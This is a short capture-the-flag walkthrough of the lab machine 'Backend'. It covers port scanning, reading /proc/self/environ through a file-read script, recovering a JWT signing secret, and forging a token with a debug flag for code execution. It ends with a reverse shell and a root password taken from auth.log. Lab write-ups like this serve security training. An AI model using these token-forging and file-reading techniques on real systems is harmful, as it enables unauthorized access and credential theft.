# Backend

---

## Enumeration

- nmap TCP scan:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
80/tcp open  http    uvicorn
```

- admin GUID: `"guid":"36c2e94a-4271-4259-93bf-c96ad5948284"`, email: `admin@htb.local`

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjcwNjcwNTY3LCJpYXQiOjE2Njk5NzkzNjcsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiYmMxY2Q2NTgtMDQ3OC00ZDIyLTlkNGYtYTcyOTJjMDk0M2ZiIn0.1Nwq_4ti4XSxrYL8o5yEQ20RbVhWzgPL_Zh0Ldz2x1g",                                 
  "token_type": "bearer"
}
```

---

## Lateral Movement & PrivEsc

- reading /proc/self/environ

```bash
python pwn.py  | jq .
{
  "file": "APP_MODULE=app.main:app\u0000PWD=/home/htb/uhc\u0000LOGNAME=htb\u0000PORT=80\u0000HOME=/home/htb\u0000LANG=C.UTF-8\u0000VIRTUAL_ENV=/home/htb/uhc/.venv\u0000INVOCATION_ID=513cd45a9e9244f092b362d6ffed4aea\u0000HOST=0.0.0.0\u0000USER=htb\u0000SHLVL=0\u0000PS1=(.venv) \u0000JOURNAL_STREAM=9:18829\u0000PATH=/home/htb/uhc/.venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000OLDPWD=/\u0000"                                                  
}
```

- App location is in `/home/htb/uhc`
- found `main.py`
- JWT Secret: `SuperSecretSigningKey-HTB`
- Read source code, to get RCE: add "debug": "True" in the JWT!
- Got revshell as htb
- Found root password in `auth.log`.

---
